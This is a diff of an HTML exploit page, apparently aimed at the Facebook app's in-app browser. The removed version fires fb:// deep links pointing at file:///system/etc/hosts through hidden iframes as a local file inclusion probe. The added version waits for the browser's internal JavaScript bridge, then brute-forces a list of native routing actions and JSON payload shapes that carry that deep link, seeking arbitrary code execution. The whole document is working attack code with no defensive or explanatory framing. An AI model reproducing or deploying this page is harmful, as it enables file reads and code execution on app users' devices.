@@ -2,55 +2,59 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>FB Deep Link LFI/ACE</title>
+    <title>JSI Router Bypass ACE</title>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace;">
-    <h3>Snipping Internal FB Deep Links...</h3>
-    <div id="log">Testing routes...</div>
+    <h3>Bypassing Java Linkshim...</h3>
+    <div id="log">Hunting for native routing actions...<br></div>
 
     <script>
         const logEl = document.getElementById('log');
+        function log(msg) { logEl.innerHTML += msg + "<br>"; }
 
-        // We use a universal Android system file to prove Local File Inclusion
+        const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
+        
+        // The LFI payload
         const targetFile = "file:///system/etc/hosts";
+        const deepLink = `fb://faceweb/f?href=${targetFile}`;
 
-        // A list of historically vulnerable FB internal routing schemas
-        const deepLinks = [
-            `fb://faceweb/f?href=${targetFile}`,
-            `fb://browser?url=${targetFile}`,
-            `fb://webview?url=${targetFile}`,
-            `fb://native_post?href=${targetFile}`,
-            `fb://notification_settings?browser_uri=${targetFile}`,
-            `fb://page_browser?url=${targetFile}`,
-            `fb://canvas?url=${targetFile}`
+        // We package the payload in every conceivable JSON format FB might expect
+        const payloads = [
+            JSON.stringify({ url: deepLink }),
+            JSON.stringify({ uri: deepLink }),
+            JSON.stringify({ href: deepLink }),
+            JSON.stringify({ intent: deepLink }),
+            JSON.stringify({ action: "open", url: deepLink })
         ];
 
-        let currentIndex = 0;
+        // A massive dictionary of potential native routing commands
+        const actions = [
+            "open_url", "launch_uri", "handle_intent", "open_deep_link", 
+            "navigate_to", "browser_navigate", "open_faceweb", "start_activity",
+            "route_intent", "iab_open_url", "iab_launch", "execute_route"
+        ];
 
-        function fireNextLink() {
-            if (currentIndex >= deepLinks.length) {
-                logEl.innerHTML += "<br>[*] Payload cycle complete.";
-                return;
+        function fireNativeRouter() {
+            let bridge = window.__call_iabjs_unified_bridge;
+            log("[*] Bridge acquired. Brute-forcing action dictionary...");
+
+            // Cross-multiply every action with every JSON payload structure
+            for (let action of actions) {
+                for (let payload of payloads) {
+                    try {
+                        bridge(action, uuid, payload);
+                    } catch(e) {}
+                }
             }
-
-            let link = deepLinks[currentIndex];
-            logEl.innerHTML += `<br>[*] Firing: ${link}`;
-            
-            // We use an invisible iframe to fire the deep links without
-            // destroying our main execution context
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = link;
-            document.body.appendChild(iframe);
-
-            currentIndex++;
-            
-            // Fire the next link after 800ms
-            setTimeout(fireNextLink, 800);
+            log("<span style='color:yellow;'>[*] Salvo fired. Check screen.</span>");
         }
 
-        // Delay start to ensure the page is fully loaded in the IAB
-        setTimeout(fireNextLink, 1000);
+        let check = setInterval(() => {
+            if (typeof window.__call_iabjs_unified_bridge === 'function') {
+                clearInterval(check);
+                fireNativeRouter();
+            }
+        }, 100);
     </script>
 </body>
 </html>
